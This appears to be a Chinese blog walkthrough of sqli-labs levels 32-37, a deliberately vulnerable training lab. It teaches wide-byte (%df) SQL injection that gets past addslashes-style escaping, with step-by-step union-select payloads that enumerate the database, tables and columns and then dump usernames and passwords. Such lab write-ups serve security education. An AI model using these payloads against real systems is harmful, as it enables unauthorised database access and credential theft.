# 原创
：  （手工）【sqli-labs32-38】宽字节注入、报错回显、字符/数字型注入

# （手工）【sqli-labs32-38】宽字节注入、报错回显、字符/数字型注入

**目录**

[一、推荐：](#%C2%A0%E6%8E%A8%E8%8D%90%EF%BC%9A)

[二、（手工）SQL注入基本步骤：](#%E4%B8%80%E3%80%81%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%88%E6%89%8B%E5%B7%A5%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A)

[三、Less32（GET-Bypass custom filter adding slashes to dangerous chars）](#%E4%BA%8C%E3%80%81Less8%EF%BC%88GET%20-%20Blind%20-%20Boolian%20Based%20-%20Single%20Quotes%EF%BC%89)

[3.1、简介：（宽字节注入-报错回显-字符型注入）](#2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5%EF%BC%89)

[3.2、第一步：注入点测试](#2.2%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95)

[ 3.3、第二步：分析过滤](#%C2%A02.3%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%88%86%E6%9E%90%E8%BF%87%E6%BB%A4)

[3.4、第三步：判断字段数/回显位](#2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0)

[3.5、第四步：暴库](#2.4%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%9A%B4%E5%BA%93)

[3.6、第五步：爆表名](#%C2%A0%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E7%88%86%E8%A1%A8%E5%90%8D)

[3.7、第六步：爆字段](#%C2%A0%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%88%86%E5%AD%97%E6%AE%B5)

[3.8、第七步：爆数据](#%C2%A0%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE)

[四、Less33（GET-Bypass AddSlashes()）](#%E5%9B%9B%E3%80%81Less33%EF%BC%88GET-Bypass%20AddSlashes%28%29%EF%BC%89)

[4.1、简介：（宽字节注入-报错回显-字符型注入）](#4.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%89)

[4.2、利用：](#4.2%E3%80%81%E5%88%A9%E7%94%A8%EF%BC%9A)

[五、Less34（POST-Bypass AddSlashes()）](#%E4%BA%94%E3%80%81Less34%EF%BC%88POST-Bypass%20AddSlashes%28%29%EF%BC%89)

[5.1、简介：（宽字节注入-报错回显-字符型注入）](#5.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%89)

[5.2、利用：](#%E5%88%A9%E7%94%A8%EF%BC%9A)

[六、Less35（GET-Bypass AddSlashes(we dont need them) integer based）](#%E5%85%AD%E3%80%81Less35%EF%BC%88GET-Bypass%20AddSlashes%28we%20dont%20need%20them%29%20integer%20based%EF%BC%89)

[6.1、简介：（宽字节注入-编码-报错回显-数字型注入）](#6.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-%E7%BC%96%E7%A0%81-%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%89)

[6.2、利用：](#%E5%88%A9%E7%94%A8%EF%BC%9A)

[七、Less36（GET-Bypass MYSQL_real_escape_string）](#%E4%B8%83%E3%80%81Less36%EF%BC%88GET-Bypass%20MYSQL_real_escape_string%EF%BC%89)

[7.1、简介：（宽字节注入-报错回显-字符型注入）](#7.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%89)

[7.2、利用：](#%E5%88%A9%E7%94%A8%EF%BC%9A)

[八、Less37（POST-Bypass MYSQL_real_escape_string）](#%E5%85%AB%E3%80%81Less37%EF%BC%88POST-Bypass%20MYSQL_real_escape_string%EF%BC%89)

[8.1、简介：（宽字节注入-报错回显-字符型注入）](#8.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%89)

[8.2、利用：](#%E5%88%A9%E7%94%A8%EF%BC%9A)

---


> 
<h2>一、推荐：</h2>
[【SQL注入】宽字节注入：原理、利用<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125785293?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/125785293?spm=1001.2014.3001.5501)
[【SQL注入-可回显】报错注入：简介、相关函数、利用方法https://blog.csdn.net/qq_53079406/article/details/125017089?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165777639916781647571668%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165777639916781647571668&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125017089-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E6%8A%A5%E9%94%99&amp;spm=1018.2226.3001.4450<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125017089?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165777639916781647571668%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165777639916781647571668&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125017089-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E6%8A%A5%E9%94%99&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/125017089?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165777639916781647571668%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165777639916781647571668&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-125017089-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E6%8A%A5%E9%94%99&amp;spm=1018.2226.3001.4450)

[【SQL注入】数字型注入 &amp; 字符型注入https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/125741101?spm=1001.2014.3001.5501)
[【WAF绕过】SQL注入、文件上传、XSShttps://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450https://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450https://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450https://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/124882861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165759520116782390512182%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165759520116782390512182&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-124882861-null-null.185%5Ev2%5Econtrol&amp;utm_term=SQL%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4450)


---


---


## 二、（手工）SQL注入基本步骤：

> 
第一步：注入点测试
第二步：分析权限
第三步：判断字段数
第四步：爆数据库名
第五步：爆表名
第六步：爆字段名
第七步：爆数据


---


---


## 三、Less32（GET-Bypass custom filter adding slashes to dangerous chars）

> 
<h3>3.1、简介：（宽字节注入-报错回显-字符型注入）</h3>
请求方法：GET
方法：宽字节注入+闭合（字符型注入）+报错回显


> 
<h3>3.2、第一步：注入点测试</h3>
输入?id=1 
 后面加上单引号、双引号都不报错

 根据下面的提示，可知
是引号被\转义了
无法判断是否存在注入点

<hr/>
考虑使用宽字节注入
?id=1%df'
加单引号报错，说明存在注入点

<hr/>
 ?id=1%df'#
#被过滤

 ?id=1%df'--+


说明为单引号注入


---


> 
<h3> 3.3、第二步：分析过滤</h3>
方法一：
考虑一步一步将注入语句字符一个一个替换掉，直到不报错（浪费时间）
或者全部替换（如果报错，不知道哪里被过滤了）
<hr/>
方法二：
获取源码进行白盒审计（最优）
<hr/>方法三： 
 eg：输入?id=and or union select --+ updatexml # extractvalue（重要的都输进去）
看输入回显过滤语句的情况

#被过滤了 


---


> 
<h3>3.4、第三步：判断字段数/回显位</h3>
?id=1%df' union select 1,2,3 --+
回显正常


?id=1%df' union select 1,2,3,4 --+
报错


 说明字段数为3
<hr/>
判断回显位
?id=-1%df' union select 1,2,3 --+




> 
<h3>3.5、第四步：暴库</h3>
?id=-1%df' union select 1,2,database() --+




> 
<h3>3.6、第五步：爆表名</h3>
?id=-1%df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
'security'的单引号也会被转义，可以直接进行十六进制编码,或者使用database()





> 
<h3>3.7、第六步：爆字段</h3>
?id=-1%df' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+
'user'的单引号也会被转义，可以直接进行十六进制编码





> 
<h3>3.8、第七步：爆数据</h3>
?id=-1%df' union select 1,2,group_concat(username,password) from security.users--+





---


---


## 四、Less33（GET-Bypass AddSlashes()）

> 
<h3>4.1、简介：（宽字节注入-报错回显-字符型注入）</h3>
请求方法：GET
方法：宽字节注入+闭合（字符型注入）+报错回显


> 
<h3>4.2、利用：</h3>
与32关一模一样


---


---


## 五、Less34（POST-Bypass AddSlashes()）

> 
<h3>5.1、简介：（宽字节注入-报错回显-字符型注入）</h3>
请求方法：POST
方法：宽字节注入+闭合（字符型注入）+报错回显


> 
<h3>5.2、利用：</h3>
将32、33改为POST提交
其余没变，不试了


---


---


## 六、Less35（GET-Bypass AddSlashes(we dont need them) integer based）

> 
<h3>6.1、简介：（宽字节注入-编码-报错回显-数字型注入）</h3>
请求方法：POST
方法：宽字节注入+闭合（数字型注入）+编码+报错回显


> 
<h3>6.2、利用：</h3>
[（手工）【sqli-labs35】宽字节、数字型、编码、报错注入<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/125792425?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/125792425?spm=1001.2014.3001.5501)


---


---


## 七、Less36（GET-Bypass MYSQL_real_escape_string）

> 
<h3>7.1、简介：（宽字节注入-报错回显-字符型注入）</h3>
请求方法：GET
方法：宽字节注入+闭合（字符型注入）+报错回显


> 
<h3>7.2、利用：</h3>
同Less32的payload


---


---


## 八、Less37（POST-Bypass MYSQL_real_escape_string）

> 
<h3>8.1、简介：（宽字节注入-报错回显-字符型注入）</h3>
请求方法：GET
方法：宽字节注入+闭合（字符型注入）+报错回显


> 
<h3>8.2、利用：</h3>
同Less32的payload

